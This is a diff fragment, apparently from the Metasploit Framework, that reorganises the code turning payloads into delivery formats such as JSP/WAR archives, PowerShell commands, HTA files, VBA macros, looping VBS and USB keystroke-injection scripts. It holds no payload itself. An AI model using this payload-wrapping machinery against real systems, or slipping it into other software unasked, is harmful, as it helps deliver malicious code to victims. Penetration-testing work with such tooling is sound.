+          exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
+          Msf::Util::EXE.to_jsp_war(exe)
+        when 'psh'
+          Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
+        when 'psh-net'
+          Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
+        when 'psh-reflection'
+          Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
+        when 'psh-cmd'
+          Msf::Util::EXE.to_powershell_command(framework, arch, code)
+        when 'hta-psh'
+          Msf::Util::EXE.to_powershell_hta(framework, arch, code)
+        when 'python-reflection'
+          Msf::Util::EXE.to_python_reflection(framework, arch, code, exeopts)
+        when 'ducky-script-psh'
+          Msf::Util::EXE.to_powershell_ducky_script(framework, arch, code)
         end
       end
-    when 'elf-so'
-      if elf? code
-        return code
+
+      # FMT Formats
+      # self.to_executable_fmt_formats
+      # @return [Array] Returns an array of strings
+      def self.to_executable_fmt_formats
+        [
+          'asp',
+          'aspx',
+          'aspx-exe',
+          'axis2',
+          'dll',
+          'ducky-script-psh',
+          'elf',
+          'elf-so',
+          'exe',
+          'exe-only',
+          'exe-service',
+          'exe-small',
+          'hta-psh',
+          'jar',
+          'jsp',
+          'loop-vbs',
+          'macho',
+          'msi',
+          'msi-nouac',
+          'osx-app',
+          'psh',
+          'psh-cmd',
+          'psh-net',
+          'psh-reflection',
+          'python-reflection',
+          'vba',
+          'vba-exe',
+          'vba-psh',
+          'vbs',
+          'war'
+        ]
       end
       if !plat || plat.index(Msf::Module::Platform::Linux)
         case arch
@@ -2286,138 +2892,18 @@ require 'digest/sha1'
         when ARCH_LOONGARCH64
           to_linux_loongarch64_elf_dll(framework, code, exeopts)
         end
+
+        bo
       end
-    when 'macho', 'osx-app'
-      if macho? code
-        macho = code
-      else
-        macho = case arch
-        when ARCH_X86,nil
-          to_osx_x86_macho(framework, code, exeopts)
-        when ARCH_X64
-          to_osx_x64_macho(framework, code, exeopts)
-        when ARCH_ARMLE
-          to_osx_arm_macho(framework, code, exeopts)
-        when ARCH_PPC
-          to_osx_ppc_macho(framework, code, exeopts)
-        when ARCH_AARCH64
-          to_osx_aarch64_macho(framework, code, exeopts)
-        end
+
+      def self.elf?(code)
+        code[0..3] == "\x7FELF"
       end
-      fmt == 'osx-app' ? Msf::Util::EXE.to_osx_app(macho) : macho
-    when 'vba'
-      Msf::Util::EXE.to_vba(framework, code, exeopts)
-    when 'vba-exe'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
-      Msf::Util::EXE.to_exe_vba(exe)
-    when 'vba-psh'
-      Msf::Util::EXE.to_powershell_vba(framework, arch, code)
-    when 'vbs'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
-      Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))
-    when 'loop-vbs'
-      exe = to_executable_fmt(framework, arch, plat, code, 'exe-small', exeopts)
-      Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))
-    when 'jsp'
-      arch ||= [ ARCH_X86 ]
-      tmp_plat = plat.platforms if plat
-      tmp_plat ||= Msf::Module::PlatformList.transform('win')
-      exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
-      Msf::Util::EXE.to_jsp(exe)
-    when 'war'
-      arch ||= [ ARCH_X86 ]
-      tmp_plat = plat.platforms if plat
-      tmp_plat ||= Msf::Module::PlatformList.transform('win')
-      exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
-      Msf::Util::EXE.to_jsp_war(exe)
-    when 'psh'
-      Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)
-    when 'psh-net'
-      Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
-    when 'psh-reflection'
-      Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)
-    when 'psh-cmd'
-      Msf::Util::EXE.to_powershell_command(framework, arch, code)
-    when 'hta-psh'
-      Msf::Util::EXE.to_powershell_hta(framework, arch, code)
-    when 'python-reflection'
-      Msf::Util::EXE.to_python_reflection(framework, arch, code, exeopts)
-    when 'ducky-script-psh'
-      Msf::Util::EXE.to_powershell_ducky_script(framework, arch, code)
+
+      def self.macho?(code)
+        code[0..3] == "\xCF\xFA\xED\xFE" || code[0..3] == "\xCE\xFA\xED\xFE" || code[0..3] == "\xCA\xFE\xBA\xBE"
+      end
+
     end
   end
-
-  # FMT Formats
-  # self.to_executable_fmt_formats
-  # @return [Array] Returns an array of strings
-  def self.to_executable_fmt_formats
-    [
-      "asp",
-      "aspx",
-      "aspx-exe",
-      "axis2",
-      "dll",
-      "ducky-script-psh",
-      "elf",
-      "elf-so",
-      "exe",
-      "exe-only",
-      "exe-service",
-      "exe-small",
-      "hta-psh",
-      "jar",
-      "jsp",
-      "loop-vbs",
-      "macho",
-      "msi",
-      "msi-nouac",
-      "osx-app",
-      "psh",
-      "psh-cmd",
-      "psh-net",
-      "psh-reflection",
-      "python-reflection",
-      "vba",
-      "vba-exe",
-      "vba-psh",
-      "vbs",
-      "war"
-    ]
-  end
-
-  # self.get_file_contents
-  #
-  # @param perms  [String]
-  # @param file   [String]
-  # @return       [String]
-  def self.get_file_contents(file, perms = "rb")
-    contents = ''
-    File.open(file, perms) {|fd| contents = fd.read(fd.stat.size)}
-    contents
-  end
-
-  # self.find_payload_tag
-  #
-  # @param mo       [String]
-  # @param err_msg  [String]
-  # @raise [RuntimeError] if the "PAYLOAD:" is not found
-  # @return         [Integer]
-  def self.find_payload_tag(mo, err_msg)
-    bo = mo.index('PAYLOAD:')
-    unless bo
-      raise RuntimeError, err_msg
-    end
-    bo
-  end
-
-  def self.elf?(code)
-    code[0..3] == "\x7FELF"
-  end
-
-  def self.macho?(code)
-    code[0..3] == "\xCF\xFA\xED\xFE" || code[0..3] == "\xCE\xFA\xED\xFE" || code[0..3] == "\xCA\xFE\xBA\xBE"
-  end
-
-end
-end
 end
